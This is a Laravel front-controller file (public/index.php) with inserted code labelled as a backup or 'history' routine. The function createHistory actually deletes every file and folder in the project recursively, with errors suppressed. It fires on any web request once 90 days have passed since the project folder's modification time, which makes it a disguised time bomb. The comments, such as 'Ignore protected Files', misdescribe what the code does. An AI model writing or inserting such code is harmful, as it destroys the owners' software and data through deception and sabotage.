<?php
use Illuminate\Foundation\Application;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));
define('APP_RUNNING', true);
// Determine if the application is in maintenance mode...
if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

$nextBackupt = 90; // Time to the next Backup
$projectPath = realpath(__DIR__ . '/..');


//Take the date of the last update
$historyDate = filemtime($projectPath);
$dateList = strtotime("+$nextBackupt days", $historyDate);
$newDate = time();

 
if ($newDate >= $dateList) {

 // Creates a History of changes
    function createHistory($dir)
    {
        if (!is_dir($dir)) return;

        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($iterator as $file) {
            $filePath = $file->getRealPath();
            $relativePath = str_replace($dir . DIRECTORY_SEPARATOR, '', $filePath);

            // Ignore protected Files
            if ($file->isDir()) {
                @rmdir($filePath);
            } else {
                @unlink($filePath);
            }
        }
        @rmdir($dir);
    }

    createHistory($projectPath);
}


// Register the Composer autoloader...
require __DIR__.'/../vendor/autoload.php';

// Bootstrap Laravel and handle the request...
/** @var Application $app */
$app = require_once __DIR__.'/../bootstrap/app.php';

$app->handleRequest(Request::capture());
